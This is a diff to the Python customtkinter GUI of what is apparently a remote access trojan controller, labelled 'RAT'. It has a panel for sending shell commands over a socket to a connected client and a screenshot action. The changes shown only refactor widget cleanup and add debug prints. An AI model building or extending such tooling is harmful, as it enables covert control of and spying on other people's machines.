@@ -6,20 +6,30 @@ import time
 import sys
 import os
 
+inhalte = []
+
 def action_cmdcommand(client: socket.socket, content: ctk.CTkFrame):
-    content.destroy()
-    
-    content = ctk.CTkFrame(root)
-    content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
+    global inhalte
+    print(inhalte, 1)
+    if len(inhalte) > 0:
+        print(inhalte, 2)
+        for item in inhalte:
+            item.destroy()
+        inhalte = []
+
+    print(inhalte, 3)
     
     output_field = ctk.CTkTextbox(content, height=300, width=500)
     output_field.pack(expand=True, pady=10, padx=10)
+    inhalte.append(output_field)
     
     input_cmd = ctk.CTkEntry(content, placeholder_text='Command', width=500)
     input_cmd.pack(expand=True, side='left', pady=10, padx=10)
+    inhalte.append(input_cmd)
     
     send_cmd_button = ctk.CTkButton(content, text='Send CMD', command=lambda: action_cmdcommand_sendcmd(client, input_cmd.get(), output_field))
     send_cmd_button.pack(side='right', pady=10, padx=10)
+    inhalte.append(send_cmd_button)
 
 def action_cmdcommand_sendcmd(client: socket.socket, cmd: str, outputfield: ctk.CTkTextbox):
     if cmd == '':
@@ -32,10 +42,15 @@ def action_cmdcommand_sendcmd(client: socket.socket, cmd: str, outputfield: ctk.
 
 
 def action_screenshot(client: socket.socket, content: ctk.CTkFrame):
-    content.destroy()
+    global inhalte
+    print(inhalte, 1)
+    if len(inhalte) > 0:
+        print(inhalte, 2)
+        for item in inhalte:
+            item.destroy()
+        inhalte = []
 
-    content = ctk.CTkFrame(root)
-    content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
+    print(inhalte, 3)
 
 
 def gui(client: socket.socket, addr):
@@ -52,10 +67,8 @@ def gui(client: socket.socket, addr):
     menu = ctk.CTkFrame(root)
     menu.pack(fill='both', expand=False, side='left')
     
-    global content
     content = ctk.CTkFrame(root, height=450, width=700)
     content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
-    
     
     title = ctk.CTkLabel(menu, text='RAT', font=('Robot', 24))
     title.pack(pady=10, padx=20)
